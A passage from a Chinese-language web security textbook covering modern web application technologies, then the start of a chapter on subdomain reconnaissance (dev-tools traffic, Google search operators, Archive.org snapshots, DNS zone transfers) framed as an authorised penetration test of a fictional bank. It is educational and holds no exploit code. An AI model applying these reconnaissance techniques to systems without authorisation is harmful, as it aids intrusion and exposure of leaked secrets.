第二次调用记录函数时，它们没有按顺序解析。为什么？在网络编程中，请求经常需要花费可变的时间、发生超时并且以不可预测的方式运行。在基于 JavaScript 的 Web 应用中，这通常通过异步编程模型来处理，而不是简单地等待一个请求完成之后才启动另一个请求。这样做带来的好处是巨大的性能提升，其速度可以比同步替代方案快数十倍。我们不强制请求一个接一个地完成，而是同时发起所有请求，然后编写程序，规定它们在解析时应该做什么——这在解析发生之前就已经规划好了。

在较旧版本的 JavaScript 中，这通常是通过一个名为**回调函数（Callbacks）**的系统来完成的：

```javascript
const config = {
 privacy: public,
 acceptRequests: true
};
/*
 * First request a user object from the server.
 * Once that has completed, request a user profile from the server.
 * Once that has completed, set the user profile config.
 * Once that has completed, console.log "success!"
 */
getUser(function(user) {
 getUserProfile(user, function(profile) {
 setUserProfileConfig(profile, config, function(result) {
 console.log('success!');
 });
 });
});
```

虽然与同步模型相比，回调函数非常快速且高效，但它们极难阅读和调试。后来的编程哲学建议创建一个可重用的对象，该对象在给定函数完成后调用下一个函数。这些被称为 **Promises**，它们在当今的许多编程语言中都有使用：

```javascript
const config = {
 privacy: public,
 acceptRequests: true
};
/*
 * First request a user object from the server.
 * Once that has completed, request a user profile from the server.
 * Once that has completed, set the user profile config.
 * Once that has completed, console.log "success!"
 */
const promise = new Promise((resolve, reject) => {
 getUser(function(user) {
 if (user) { return resolve(user); }
 return reject();
 });
}).then((user) => {
 getUserProfile(user, function(profile) {
 if (profile) { return resolve(profile); }
 return reject();
 });
}).then((profile) => {
 setUserProfile(profile, config, function(result) {
 if (result) { return resolve(result); }
 return reject();
 });
}).catch((err) => {
 console.log('an error occurred!');
});
```

上述两个示例都实现了完全相同的应用逻辑。区别在于可读性和组织结构。基于 Promise 的方法可以被进一步分解，垂直增长而不是水平增长，并使错误处理变得容易得多。根据程序员的喜好，Promises 和回调函数是可以互操作并一起使用的。

处理异步的最新方法是 `async` 函数。与普通的函数对象不同，这些函数旨在使处理异步变得易如反掌。

思考以下 `async` 函数：

```javascript
const config = {
 privacy: public,
 acceptRequests: true
};
/*
 * First request a user object from the server.
 * Once that has completed, request a user profile from the server.
 * Once that has completed, set the user profile config.
 * Once that has completed, console.log "success!"
 */
const setUserProfile = async function() {
 let user = await getUser();
 let userProfile = await getUserProfile(user);
 let setProfile = await setUserProfile(userProfile, config);
};
setUserProfile();
```

您可能会注意到这要容易阅读得多。太棒了，这正是它的意义所在！

`async` 函数将普通函数转换为 Promises。在 Promise 内部，任何在其前面带有 `await` 的方法调用都会暂停该函数内的进一步执行，直到该方法调用解析完毕。异步函数之外的代码仍然可以正常运行。

从本质上讲，`async` 函数将普通函数转换为 Promise。随着时间的推移，您会在客户端代码和基于 JavaScript 的服务端代码中越来越多地看到这些函数。

---

### 浏览器 DOM

您现在应该对异步编程有了足够的理解——这是在 Web 和客户端/服务器应用中占主导地位的模型。记住这些信息后，您需要了解的最后一个与 JavaScript 相关的概念就是浏览器 DOM。

DOM 是用于在现代 Web 浏览器中管理状态的分层表示数据。

JavaScript 是一种编程语言，和任何优秀的编程语言一样，它依赖于一个功能强大的标准库。这个库与其他语言中的标准库不同，被称为 DOM。DOM 提供了经过充分测试且性能优异的常规功能，并在所有主流浏览器中都有实现，因此您的代码在不同的浏览器上运行时的表现应该完全相同或几乎完全相同。

与其他标准库不同，DOM 的存在主要是为了提供一个通用接口，以便定义代表 Web 页面的节点分层树（补足语言功能漏洞或提供通用功能是 DOM 的次要功能）。您可能曾不小心调用过 DOM 函数，并以为它是 JS 原生函数。例如 `document.querySelector()` 和 `document.implementation`。

构成 DOM 的主要对象是 `window` 和 `document`。每个对象都在由一个名为 WHATWG 的组织维护的规范中进行了仔细的定义。

无论您是 JavaScript 开发人员、Web 应用渗透测试人员还是安全工程师，深入理解浏览器 DOM 及其在 Web 应用中的作用，对于发现应用表征层（Presentation Layer）显现出的漏洞都至关重要。将 DOM 视为向最终用户部署基于 JavaScript 的应用的框架。请记住，并非所有与脚本相关的安全漏洞都是由于不当的 JavaScript 导致的；它们有时可能是由于不当的浏览器 DOM 实现引起的。

---

### SPA 框架

早期的网站通常是结合临时编写的脚本来操作 DOM，以及大量重复使用的 HTML 模板代码构建而成的。这并不是一个可扩展的模型，虽然它适用于向最终用户交付静态内容，但它不适用于交付复杂的、富含逻辑的应用。

当时的桌面应用软件功能强大，允许用户存储和维护应用状态。早期的网站不提供这种类型的功能，尽管许多公司更倾向于通过 Web 交付其复杂的应用，因为这能带来从易用性到防止盗版等诸多好处。

**单页应用（Single-Page Application，SPA）**框架旨在弥合网站和桌面应用之间的功能差距。SPA 框架允许开发复杂的、基于 JavaScript 的应用，这些应用可以存储自己的内部状态，并由可重用的 UI 组件组成，每个组件都有自己从渲染到逻辑执行的自我维护的生命周期。

如今 SPA 框架在 Web 上极其普遍，为最大型和最复杂的应用（如 Facebook 和 YouTube）提供支持，在这些应用中，功能是关键，并且能够提供接近桌面应用的使用体验。如今一些最大型的开源 SPA 框架是 ReactJS、EmberJS、VueJS 和 AngularJS。

这些框架都是构建在 JavaScript 和 DOM 之上的，但在安全和功能维度上都带来了额外的复杂性。

---

### 身份验证与授权系统

在大多数应用都包含客户端（浏览器/手机）和服务器，且服务器需要持久化存储最初由客户端发送的数据的世界里，必须建立相应的系统来确保未来对持久化数据的访问来自正确的用户。我们使用**身份验证（Authentication）**一词来描述允许系统识别用户的流程。换句话说，身份验证系统告诉我们“joe123”实际上是“joe123”而不是“susan1988”。

**授权（Authorization）**一词用于描述系统内部用于确定“joe123”有权访问哪些资源的流程（相对于“susan1988”而言）。例如，“joe123”应该能够访问自己上传的私密照片，而“susan1988”应该能够访问她自己的，但他们不应该能够访问彼此的照片。

这两个过程对于 Web 应用的功能都至关重要，且两者都是 Web 应用中必须实施妥善安全控制的关键功能。

#### 身份验证（Authentication）
早期的身份验证系统本质上很简单。例如，HTTP 基本认证（HTTP Basic Auth）通过在每个请求上附加一个 `Authorization` 标头来执行身份验证。该标头包含一个字符串，格式为 `Basic: <base64-encoded username:password>`（Base64 编码的用户名:密码）。服务器接收该 用户名:密码 组合，并在每个请求上将其与数据库进行比对。显而易见，这种身份验证方案有几个缺陷——例如，凭据极易通过多种方式泄露，从通过 HTTP 连接的受损 Wi-Fi 到简单的跨站脚本（XSS）攻击。

后来的身份验证发展引入了摘要认证（Digest Authentication），它采用密码学哈希（Cryptographic Hashes）代替 Base64 编码。在摘要认证之后，出现了大量新的身份验证技术和架构，包括那些不涉及密码的技术以及需要外部设备的技术。

如今，大多数 Web 应用会根据业务性质从一套身份验证架构中进行选择。例如，OAuth 协议非常适合想要与大型网站进行集成的网站。OAuth 允许大型网站（如 Facebook、Google 等）向合作伙伴网站提供一个验证用户身份的令牌。OAuth 对用户很有用，因为用户的数据只需要在一个网站上更新，而不需要在多个网站上更新——但 OAuth 也可能很危险，因为一个受损的网站可能会导致多个配置文件受损。

HTTP 基本认证和摘要认证在今天仍被广泛使用，其中摘要认证更受欢迎，因为它对拦截和重放攻击（Replay Attacks）有更多的防御措施。通常这些技术会与多因素身份验证（MFA）等工具结合使用，以确保身份验证令牌不被篡改，并且已登录用户的身份没有发生变化。

#### 授权（Authorization）
授权是身份验证之后的下一步。授权系统更难分类，因为授权非常依赖于 Web 应用内部的业务逻辑。通常来说，设计良好的应用会有一个集中式的授权类，负责确定用户是否具有访问某些资源或功能的权限。

如果 API 编写得很糟糕，它们将在每个 API 的基础上实现检查，从而手动复制授权功能。通常，如果您能看出某个应用在每个 API 中重新实现了授权检查，那么该应用很可能会因为人为错误而导致有几个 API 的检查不充分。

一些始终应该进行授权检查的常见资源包括：设置/个人资料更新、密码重置、私信读/写、任何付费功能以及任何提升权限的用户功能（例如版主功能）。

---

### Web 服务器

现代客户端/服务器 Web 应用依赖于多项相互叠加的技术，以使服务端组件和客户端组件能够按预期运行。在服务端方面，应用逻辑运行在软件 Web 服务器包之上，这样应用开发人员就无需担心处理请求和管理进程。当然，Web 服务器软件运行在操作系统（通常是 Ubuntu、CentOS 或 Red Hat 等 Linux 发行版）之上，而操作系统又运行在数据中心某处的物理服务器硬件上。

现代 Web 浏览器允许在标头级别执行各种类型的安全配置，正如我们在 CSP 和 CORS 中看到的那样。除了这些通过 HTTP 标头配置的地标性安全机制之外，还有许多其他基于标头的安全机制，它们只需极小的实现难度就能提供一定的安全提升。以下是每个现代 Web 应用都应考虑利用的几个重要但经常被忽视的安全标头。

在 Web 服务器软件方面，现代 Web 应用领域有几个大玩家。Apache 仍然服务于世界上近半数的网站，因此我们可以假设 Apache 也服务于大多数 Web 应用。Apache 是开源的，已经开发了近 30 年，运行在几乎所有的 Linux 发行版以及一些 Windows 服务器上。

Apache 不仅因其庞大的贡献者社区和开源性质而备受青睐，还因为它是如此易于配置和插拔。它是一个高度灵活的 Web 服务器，您在很长一段时间内都可能会经常看到它。

Apache 最大的竞争对手是 NGINX（发音为“Engine X”）。NGINX 运行着大约 30% 的 Web 服务器，并且正在迅速增长。尽管 NGINX 可以免费使用，但其母公司（目前为 F5 Networks）采用付费+（Paid+）模式，其中支持和额外功能需要付费。

NGINX 用于高并发（High-Volume）应用，这些应用具有大量独特的连接，而不是那些需要大量数据但连接较少的应用。在从 Apache 切换到 NGINX 时，同时为大量用户提供服务的 Web 应用可能会看到巨大的性能提升，因为 NGINX 架构中每个连接的开销要少得多。

在 NGINX 之后是 Microsoft IIS，尽管由于高昂的授权费用以及与基于 Unix 的开源软件（OSS）包缺乏兼容性，基于 Windows 的服务器的流行度已有所下降。在处理许多 Microsoft 特有技术时，IIS 是 Web 服务器的正确选择，但对于试图在开源基础之上进行构建的公司来说，它可能会成为一种负担。

还有许多其他较小的 Web 服务器，每个服务器都有自己的安全优势和劣势。熟悉这三大巨头将对您在本书后续的学习中非常有用，您将学习如何寻找源于不当配置（Improper Configuration）的漏洞，而不仅仅是应用逻辑中的漏洞。

---

### 服务端数据库

一旦客户端将数据发送到服务器进行处理，服务器通常必须持久化存储这些数据，以便在未来的会话中能够检索到它。将数据存储在内存中在长期来看是不可靠的，因为重启和崩溃可能会导致数据丢失。此外，与磁盘相比，随机存取内存（RAM）是非常昂贵的。

在将数据存储在磁盘上时，需要采取适当的预防措施，以确保能够可靠、快速地检索、存储和查询数据。几乎当今所有的 Web 应用都将用户提交的数据存储在某种类型的数据库中——通常根据特定的业务逻辑和使用场景来改变所使用的数据库。

SQL 数据库仍然是市场上最受欢迎的通用数据库。SQL 查询语言虽然严格，但可靠、快速且易于学习。SQL 可用于从存储用户凭据到管理 JSON 对象或小型图像二进制大对象（Blobs）的任何事务。其中最大型的是 PostgreSQL、Microsoft SQL Server、MySQL 和 SQLite。

当需要更灵活的存储时，可以使用无模式（Schema-less）的 NoSQL 数据库。像 MongoDB、DocumentDB 和 CouchDB 这样的数据库将信息存储为结构松散的“文档（Documents）”，这些文档非常灵活，可以在任何时候进行修改，但在查询或聚合时不如 SQL 那么容易或高效。

在今天的 Web 应用领域中，还存在更先进、更特殊的数据库。搜索引擎通常采用自己高度专业化的数据库，这些数据库必须定期与主数据库进行同步。一个例子就是广泛流行的 Elasticsearch。

每种类型的数据库都带来了独特的挑战和风险。当查询未正确构建时，SQL 注入（SQLi）是一种对主流 SQL 数据库非常有效的经典漏洞原型。然而，如果黑客愿意学习数据库的查询模型，那么针对几乎任何数据库都可能发生注入风格的攻击。

明智的做法是，要考虑到许多现代 Web 应用可以同时使用多个数据库，而且它们经常这样做。具有足够安全 SQL 查询生成的应用，其 MongoDB 或 Elasticsearch 查询和权限可能并不足够安全。

---

### 客户端数据存储

传统上，由于技术限制和跨浏览器兼容性问题，客户端存储的数据极少。这种情况正在迅速改变。许多应用现在在客户端存储大量的应用状态，通常以配置数据或大型脚本的形式存在，如果每次访问都必须下载这些数据，将会导致网络拥堵。

在大多数情况下，客户端使用由浏览器管理的、称为**本地存储（Local Storage）**的存储容器来存储和访问键/值（Key/Value）数据。本地存储遵循浏览器强制执行的 SOP（同源策略），这可以防止其他域（网站）访问彼此的本地存储数据。即使关闭浏览器或标签页，Web 应用也可以维护状态。

本地存储的一个子集称为**会话存储（Session Storage）**，其操作方式完全相同，但数据仅持续保留到标签页关闭。当数据较为敏感，且在其他用户使用同一台机器时不应保留时，可以使用这种类型的存储。

> 在架构设计不佳的 Web 应用中，客户端数据存储还可能泄露敏感信息，例如身份验证令牌或其他机密。

最后，对于更复杂的应用，如今在所有主流 Web 浏览器中都可以找到对 IndexedDB 的支持。IndexedDB 是一种基于 JavaScript 的 NoSQL 数据库，能够在 Web 应用的后台异步存储和查询数据。

因为 IndexedDB 是可查询的，所以它提供了比本地存储功能更强大的开发人员接口。IndexedDB 在基于 Web 的游戏和基于 Web 的交互式应用（如图像编辑器）中得到了应用。您可以通过在浏览器开发人员控制台中输入以下内容来检查您的浏览器是否支持 IndexedDB：`if (window.indexedDB) { console.log('true'); }`。

---

### GraphQL

GraphQL 是一种用于查询 API 端点的强大新方法，自 2015 年 9 月首次发布以来，它迅速流行起来。通常，GraphQL 是通过在服务器上包装现有的 API 端点，并允许通过 GraphQL 查询语言来查询端点来实现的——GraphQL 查询语言是一种允许将请求捆绑在一起的脚本语言，从而在网络级别节省了大量的性能开销。

与传统的单独 REST 相比，GraphQL 的查询语言允许更先进的服务端请求。由 GraphQL 包装的 REST API 提供的一些额外功能如下：

* 请求特定字段
* 复杂的请求参数
* 字段别名
* 字段片段（Field fragments）
* 操作（Operations）
* 变量（Variables）
* 指令（Directives）
* 变异（Mutations，用于写操作）

通过使用 GraphQL 查询语言提供的结构，您可以组合出如下的查询：

```graphql
query GetLeadActorFromMovie($movie: Movie)
actor(movie: $movie) {
 name, age, gender,
 otherMovies {
 name
 }
}
```

向查询提供正确的变量：

```json
{
 "movie": "Raiders of the Lost Ark"
}
```

然后服务器将返回以下内容：

```json
{
 "data": {
 "actor": {
 "name": "Harrison Ford",
 "age": 81,
 "gender": "male",
 otherMovies: [
 "Blade Runner",
 "Patriot Games",
 "Clear and Present Danger"
 ]
 }
 }
}
```

如您所见，与单独的传统 REST API 相比，GraphQL 允许执行明显更复杂的查询。如果仅使用 REST API，我们首先需要查询 `getLeadActorByMovie/:movieName`，然后查询 `getMoviesByLeadActor/:actorName`。但在 GraphQL 中，这些查询已被合并为一个——从而只需进行一次网络往返（Network Hop）而不是两次。

使用 GraphQL 的安全影响将在本书后面进行全面评估。目前，请知悉 GraphQL 允许客户端提供要在服务器上的现有 REST API 上运行的复杂脚本，以减少网络延迟。

---

### 版本控制系统（VCS）

几乎所有现代 Web 应用都是使用某种类型的**版本控制系统（Version Control System，VCS）**构建的。这些系统允许现代 Web 应用的开发人员追溯他们的修改以识别和回滚更改，创建“分支（Branches）”或功能的替代实现，并处理大量常见的部署任务。

最常用的 VCS 是 Git。Git 最初由 Linus Torvalds 和 Linux 基金会开发，但此后得到了广泛采用，并成为最流行的 VCS。Git 提供了分支（Branches）、暂存（Stashes）和派生（Forks）等工具，允许开发人员只需几条命令就能分叉并存储代码库的多个变体。

随后，Git 允许使用各种算法将这些替代副本合并（Merge）在一起，每种算法都会产生历史记录，如果需要追踪问题，可以在以后重新查看这些历史记录。最常见的托管 Git 版本控制实现是 GitHub（和 GitLab。这两者都在 Git 版本控制协议之上提供了简单易用的 API 和集成。

然而，这只是 Git 上的一个简单工作流，大多数现代 Web 应用会利用更先进的功能。其中一个典型的例子就是**持续集成（Continuous Integration）**和**持续交付（Continuous Delivery）**，即 **CI/CD**。CI/CD 工具虽然不是 Git 协议的原生部分，但通常会与 Git 集成在一起以方便使用。

通常，现代 Web 应用配置为在将新代码推送到云端托管的 Git 仓库时自动运行测试并部署。

利用 Git 命令行工具在当前工作目录下初始化 Git 仓库的常见工作流如下：

```bash
git init
git remote add origin <github-repository-url>
touch .gitignore
echo "node_modules" > .gitignore
git add -A
git commit -m "initial commit"
git push --set-upstream origin main
```

然后，将一个远程云托管的 GitHub 仓库链接到本地 Git 仓库。接下来，创建一个 `.gitignore` 文件来告诉 Git 哪些文件*不*在版本控制中进行追踪。然后命令 `git add -A` 告诉 Git 将所有更改的文件添加到暂存区（Staging）以准备提交。`git commit` 命令让 Git 知道暂存的文件已准备好被记录，而 `-m` 标志提供了一条详细说明变更集中内容的具体消息。最后，`git push` 告诉 Git 将暂存的文件推送到版本控制历史记录中，并将其远程推送到 GitHub 仓库。

出于这些原因，Web 应用的安全已不再仅仅与应用的浏览器沙箱、网络栈和应用代码绑定，还与其 VCS 和 CI/CD 流水线紧密相连。其中任何一个层面的妥协都可能是灾难性的，因此，应该对整个应用及其 VCS 和交付机制进行整体考量。

---

### CDN 与缓存

传统 Web 应用通常直接向客户端（浏览器）提供内容，并使用智能估算来计算高频请求时间段的硬件需求。许多现代 Web 应用采取了不同的方法，将静态或不经常更新的内容卸载到**内容分发网络（Content Delivery Network，CDN）**，并在应用栈的各个部分（包括客户端缓存）进行缓存。

CDN 可以通过提供全球范围内的服务器来进行扩展，这些服务器通过 API 复制您的 Web 服务器提供的静态内容。CDN 负责处理可扩展性，而 Web 服务器直接与 CDN 通信，作为单一的可信数据源（Single Source of Truth）。

这种方法具有允许开发人员极快地将应用扩展到全球的积极效果，但它也引入了许多新的安全风险。其中一个主要风险是**陈旧缓存（Stale Caching）**，它可能没有可靠或准确的信息，并可能导致权限提升或信息泄露。

虽然 CDN 充当全球缓存，但本地和网络缓存的使用更为频繁。在传统 Web 应用中未被利用的一种常见缓存形式是客户端（浏览器）缓存。浏览器提供了默认的缓存机制，可以通过 `etag` 或 `cache-control` 等标头进行配置，但许多应用还利用本地存储、会话存储和 IndexedDB 来进一步定制客户端缓存。

由于客户端和第三方 CDN/缓存采用的扩大，工程师需要评估过去十年中不经常考虑的多处数据安全。这些新系统带来了额外的复杂性，因为这些缓存可能会损坏或失去同步，从而导致新的安全挑战。

---

### 本章小结

现代 Web 应用构建在许多传统应用中所没有的新技术之上。由于功能扩展导致这一暴露面（Surface Area）增加，与过去的网站相比，今天有更多形式的攻击可以针对现代应用。

要成为当今应用生态系统中的安全专家，您不仅需要具备安全专业知识，还需要具备一定水平的软件开发技能。这十年来最顶尖的黑客和安全专家除了具备安全技能外，还带来了深厚的工程知识。他们理解应用的客户端与服务端之间的关系和架构。他们可以从服务端、客户端或两者之间的网络角度分析应用的行为。

最优秀的人才也同样理解驱动现代 Web 应用这三层的技术。因此，他们理解不同数据库、客户端技术和网络协议中固有的弱点。

虽然您不需要成为专家级软件工程师也能成为熟练的黑客或安全工程师，但这些技能将对您有所帮助，并且您会发现它们非常宝贵。它们将加速您的研究，并允许您发现深层且困难的漏洞，否则您将无法找到它们。

---

## 第 4 章 寻找子域名

要评估和测试 API 端点，您首先需要熟悉 Web 应用程序所使用的域名结构。如今，极少有仅使用单个域名来提供完整 Web 应用服务的案例。在大多数情况下，Web 应用至少会被拆分为客户端域和服务器端域，此外还有众所周知的 `https://www` 与单纯的 `https://` 之间的区别。能够循环渐进地发现并记录支持 web 应用运行的子域名，是针对该 web 应用进行侦察的一项非常实用的起步技术。

### 每个域名下的多个应用程序

假设我们正试图梳理 MegaBank 的 Web 应用程序资产，以便更好地开展由该银行授权的黑盒渗透测试（Black-Box Penetration Test）。我们知道 MegaBank 有一个供用户登录并访问其银行账户的应用。该应用位于 `https://www.mega-bank.com`。

我们特别想知道 MegaBank 是否还有其他连接到 `mega-bank.com` 域名的、可从互联网访问的服务器。我们知道 MegaBank 设有漏洞赏金（Bug Bounty）计划，并且该计划的范围非常全面地覆盖了 `mega-bank.com` 主域名。因此，`mega-bank.com` 中任何容易发现的漏洞很可能已被修复或报告。如果出现了新的漏洞，我们将不得不与时间赛跑，抢在漏洞赏金猎人之前找到它们。

正因如此，我们希望寻找一些更容易下手的目标，这些目标依然能让我们切中 MegaBank 的要害。虽然这是一次纯粹合规的、由企业资助的测试，但并不意味着我们不能寻找一些乐子。

我们首先应该做的是进行一些侦察，并在我们的 Web 应用资产图中填入与 `mega-bank.com` 关联的子域名列表。因为 `www` 指向的是面向公众的 Web 应用程序本身，我们可能对此并不感兴趣。但是，大多数大型消费级公司实际上都会托管各种与其主域名相关联的子域名。这些子域名用于托管从电子邮件、管理后台应用到文件服务器等各种服务。

寻找这些数据的方法有很多，而且通常您必须尝试几种方法才能获得所需的结果。我们将从最简单的方法开始，逐步深入。

### 浏览器内置的网络分析工具

起初，我们只需浏览 MegaBank 中可见的功能，并观察后台发起了哪些 API 请求，就可以收集到一些有用的数据。这通常能让我们轻松收获一些唾手可得的端点。为了查看这些正在发起的请求，我们可以使用 Web 浏览器自带的网络工具，或者像 Burp 或 ZAP 这样功能更强大的工具。

只要您使用的是三大主流浏览器（Chrome、Firefox 或 Edge）之一，您就会发现其中内置的开发人员工具非常强大。事实上，浏览器开发人员工具已经发展得如此先进，以至于您无需购买任何第三方工具即可轻松成为一名熟练的黑客。现代浏览器提供了用于网络分析、代码分析、带断点和文件引用的 JavaScript 运行时分析、精确的性能测量（这在旁路攻击中也可以用作黑客工具）的工具，以及用于执行轻度安全和兼容性审计的工具。

要分析流经浏览器的网络流量，请执行以下操作（以 Chrome 为例）：

1. 点击导航栏右上角的三个点以打开“设置”菜单。
2. 在“更多工具”下点击“开发人员工具”。
3. 在此菜单顶部，点击“网络”（Network）标签页。如果它不可见，请水平拉伸开发人员工具，直到它显示出来。

现在，在打开“网络”标签页的情况下，尝试在任何网站的页面之间进行导航。请注意，新的 HTTP 请求将会弹出，同时还会伴随许多其他请求。

您可以使用浏览器中的“网络”标签页查看浏览器正在处理的所有网络流量。对于较大的网站，要过滤这些流量可能会让人望而生畏。

通常，最有趣的结果来自“网络”标签页下的 **XHR**（或 Fetch/XHR）子标签页，它将向您显示对服务器发起的任何 HTTP POST、GET、PUT、DELETE 和其他请求，并过滤掉字体、图像、视频和依赖文件。您可以点击左侧窗格中的任何单个请求以查看更多详细信息。

点击这些请求中的一个将显示该请求的原始格式和格式化版本，包括任何请求头（Request Headers）和请求体（Body）。在选择请求时出现的“预览”（Preview）标签页中，您将能够看到任何 API 请求结果的精美格式化版本。

XHR 下的“响应”（Response）标签页将向您显示原始响应负载，而“耗时”（Timing）标签页将显示与请求相关的排队、下载和等待时间的非常具体的指标。这些性能指标实际上非常重要，因为它们可以用来发现**旁路攻击（Side-Channel Attack）**（一种依赖于响应以外的次要度量来衡量服务器上运行什么代码的攻击；例如，在同一个端点上调用的服务器上两个脚本之间的加载时间）。

此时，您应该对浏览器的“网络”标签页有了足够的熟悉，可以开始探索并将其用于侦察。这些工具虽然看起来有些令人望而生畏，但实际上并不难学。

当您浏览任何网站时，可以检查 **请求（Request） → 标头（Headers） → 常规（General） → 请求 URL（Request URL）**，以查看请求被发送到了哪个域名，或者响应是从哪个域名发送过来的。通常，这就是您寻找主站关联服务器所需要的全部信息。

---

### 利用公开记录

如今，互联网上存储的公开可用信息的数量是如此庞大，以至于一次意外的数据泄露可能会在无人察觉的情况下在网络角落里留存数年。一个优秀的黑客可以利用这一事实，并发现许多有趣的、可能在后续阶段演变为简易攻击的蛛丝马迹。

我在过去执行渗透测试时，在网上发现的一些典型暴露数据包括：
* 意外被公开、随后又被重新设为私有的 GitHub 仓库的缓存副本。
* SSH 密钥。
* 周期性暴露、随后又从面向公众的 Web 应用中移除的各种服务密钥（例如 Amazon AWS 或 Stripe 密钥）。
* 未打算公开的 DNS 列表和 URL。
* 详述未发布产品、本不应该上线的页面。
* 托管在 Web 上但未打算被搜索引擎爬取的财务记录。
* 电子邮件地址、电话号码和用户名。

这些信息可以在许多地方找到，例如：
* 搜索引擎。
* 社交媒体帖子。
* 网页归档应用，例如 `archive.org`。
* 图片搜索和反向图片搜索。

在试图寻找子域名时，公开记录也是一个很好的信息源，因为某些子域名可能无法通过字典暴破轻松找到，但它们可能已被上述服务之一索引。

#### 搜索引擎缓存

Google 是世界上最常用的搜索引擎，通常被认为索引了比任何其他搜索引擎都多的数据。但就其本身而言，由于需要筛选的庞大数据量，Google 搜索对于手动侦察并不是很有用。更糟糕的是，Google 严厉打击自动化请求，并会拒绝那些没有密切模拟真实浏览器行为的请求。

幸运的是，Google 为高级搜索者提供了特殊的搜索运算符，使您能够提高搜索查询的针对性。我们可以使用 `site:<my-site>` 运算符，要求 Google 仅针对特定域名进行查询：

```bash
site:mega-bank.com log in
```

在面对一个热门网站时，这样查询通常会返回主域名下成页成页的内容，而很少返回我们感兴趣的子域名的内容。您需要进一步提高搜索的精准度，才能开始发现一些有趣的内容。

利用减号（`-`）运算符可以向任何查询字符串添加特定的排除条件。例如，`-inurl:<pattern>` 将排除任何与所提供模式匹配的 URL。

一个结合使用 Google 搜索运算符 `site:` 和 `-inurl:<pattern>` 的搜索示例。通过结合使用这两个运算符，我们可以要求 Google 仅返回关于小狗（puppies）的 Wikipedia.org 网页，同时在它们的 URL 中排除包含“dog”（狗）一词的网页。此技术可用于减少返回的搜索结果数量，并在忽略特定关键字的同时搜索特定的子域名。掌握 Google 以及其他搜索引擎中的搜索运算符将使您能够找到通常不易发现的信息。

我们可以使用 `-inurl:<pattern>` 运算符来移除我们已经熟悉的子域名（如 `www`）的结果。请注意，它还会过滤掉 URL 其他部分中出现的 `www`，因为它不单指子域名，而是指整个 URL 字符串。这意味着 `https://admin.mega-bank.com/www` 也会被过滤掉，这可能会导致误报性的移除：

```bash
site:mega-bank.com -inurl:www
```

您可以在许多网站上尝试此操作，您会发现一些您甚至从未想过存在的子域名。例如，让我们在热门新闻网站 Reddit 上进行尝试：

```bash
site:reddit.com -inurl:www
```

此查询的第一个结果将是 `code.reddit.com`——这是一个用于 Reddit 早期版本代码的归档库，官方决定将其向公众开放。像 Reddit 这样的网站会故意向公众公开这些域名。

对于我们针对 MegaBank 的渗透测试，如果我们发现了其他被故意公开且我们不感兴趣的域名，我们只需将它们也过滤掉即可。如果 MegaBank 有一个托管在子域名 `mobile.mega-bank.com` 下的移动版本，我们也可以轻松地将其过滤掉：

```bash
site:mega-bank.com -inurl:www -inurl:mobile
```

在尝试寻找给定站点的子域名时，您可以重复此过程，直到找不到更多相关的结果。将这些技术应用于其他搜索引擎（如 Bing）也是有益的——大型搜索引擎都支持类似的运算符。

记录您通过该技术发现的任何有趣信息，然后继续尝试其他子域名侦察方法。

---

### 意外归档

像 Archive.org 这样的公共归档工具非常有用，因为它们会定期建立网站的快照，并允许您访问过去的网站备份。由于许多网站关停且新网站会接管它们的域名，Archive.org 致力于保留互联网的历史。

因为 Archive.org 存储了网站的历史快照（有时可以追溯到 20 年前），所以该网站是寻找曾经被公开（故意或意外）但后来被删除的信息的宝库。图 4-5 中的特定快照是 2003 年（二十多年前）索引的 Wikipedia.org 首页！

一般而言，搜索引擎会索引关于网站的数据，但会尝试定期爬取该网站以保持其缓存处于最新状态。这意味着您应该在搜索引擎中寻找相关的*当前*数据，但对于相关的*历史*数据，寻找网站归档可能会是更好的选择。

如果我们知道或可以推测出 Web 应用程序发布重大版本或暴露出严重安全漏洞的时间点，历史快照就会变得尤为珍贵。在寻找子域名时，历史档案通常会通过曾经暴露在 HTML 或 JS 中、但在当前上线的应用中不再可见的超链接来公开这些子域名。

如果我们在浏览器中右键点击 Archive.org 的快照并选择“查看网页源代码”，我们可以快速搜索常见的 URL 模式。搜索 file:// 可能会拉出以前有效的下载链接，而搜索 https:// 或 http:// 应该会带出所有的 HTTP 超链接。

我们可以通过以下简单步骤，自动化从网页归档中发现子域名的过程：

1. 打开 10 个来自不同日期、且间隔时间较长的归档快照。
2. 右键点击“查看网页源代码”，然后按 `Ctrl-A` 选中所有 HTML。
3. 按 `Ctrl-C` 将 HTML 复制到剪贴板。
4. 在您的桌面上创建一个名为 `legacy-source.html` 的文件。
5. 按 `Ctrl-V` 将归档中的源代码粘贴到该文件中。
6. 对您打开的其他 9 个归档快照重复此操作。
7. 在您最喜欢的文本编辑器（VIM、Atom、VSCode 等）中打开此文件。
8. 搜索最常见的 URL 方案（URL Schemes）：
   * `http://`
   * `https://`
   * `file://`
   * `ftp://`
   * `ftps://`

您可以在规范文档中找到浏览器支持的 URL 方案的完整列表，所有主流浏览器都使用该文档来定义应支持哪些方案。

---

### 区域传送攻击

浏览面向公众的 Web 应用并分析网络请求只能带您走这么远。我们还希望找到与 MegaBank 关联但未以任何方式链接到公开 Web 应用的子域名。

**DNS 区域传送攻击（DNS Zone Transfer Attack）** 是一种针对配置不当的域名系统（DNS）服务器的侦察技巧。它并不是真正意义上的“黑客入侵”，尽管其名字暗示了这一点。相反，它只是一种几乎不需要耗费精力就能使用的信息收集技术，如果成功，可以为我们提供一些宝贵的信息。从本质上讲，DNS 区域传送攻击代表个人发起一个专门格式化的请求，旨在模仿来自合法 DNS 服务器的合法 DNS 区域传送请求。

DNS 服务器负责将人类可读的域名（例如 `https://mega-bank.com`）翻译为机器可读的 IP 地址（例如 `195.250.100.195`），这些 IP 地址是分层的，并使用通用模式进行存储，以便于请求和遍历。DNS 服务器非常宝贵，因为它们允许更改服务器的 IP 地址，而无需更新该服务器上的应用用户。换句话说，用户可以持续访问 `https://www.mega-bank.com`，而无需担心请求会解析到哪个物理服务器。

DNS 系统高度依赖其与其他 DNS 服务器同步 DNS 记录更新的能力。DNS 区域传送是 DNS 服务器之间共享 DNS 记录的一种标准化方式。记录以被称为 **区域文件（Zone File）** 的文本格式进行共享。

区域文件通常包含不希望被轻易访问的 DNS 配置数据。因此，配置得当的 DNS 主服务器应该只能解析由另一个获得授权的 DNS 辅助服务器发起的区域传送请求。如果 DNS 服务器未正确配置为仅解析针对特定指定 DNS 服务器的请求，它将容易受到恶意攻击者的攻击。

